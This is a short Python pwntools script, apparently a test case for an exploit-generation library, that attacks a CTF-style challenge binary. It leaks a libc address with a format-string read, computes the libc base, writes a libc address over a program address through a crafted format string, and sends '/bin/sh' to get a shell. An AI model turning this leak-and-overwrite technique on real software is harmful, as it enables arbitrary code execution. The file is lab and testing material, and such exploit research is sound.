from pwn import *

import os
import sf
import sys
import signal

target = process("./chall-test_FmtString-24-x86", env={"LD_PRELOAD":"./libc-2.30.so"})
gdb.attach(target)
bof_payload = sf.BufferOverflow(arch=32)

leakPayload = b""
leakPayload += b"xxxxxxx"
leakPayload += b"%2$x"
leakPayload += b"yyyyyyy"
target.sendline(leakPayload)
leak = target.recvuntil(b"yyyyyyy")
leak = leak.strip(b"yyyyyyy")
leak = leak.split(b"xxxxxxx")[1]
leak = int(leak, 0x10)

libc_base = leak - 0x1e9580
print("libcBase is: %s" % hex(libc_base))
fs = sf.WriteFmtStr(
		arch = 32,
		value = 0x458b0,
		address = 0x804b2a0,
		offset = 0x6,
		printed_bytes = 0x0,
		alignment_bytes = 0x0,
		value_base = libc_base,
		address_base = 0)
payload = fs.generate_fmt_str()
target.sendline(payload)

target.sendline("/bin/sh\x00")


# Exploit Verification starts here 15935728

def handler(signum, frame):
	raise Exception("Timed out")

signal.signal(signal.SIGALRM, handler)
signal.alarm(2)

try:
	while True:
		target.recvall(timeout=2)
except Exception:
	print("Exploit timed out")
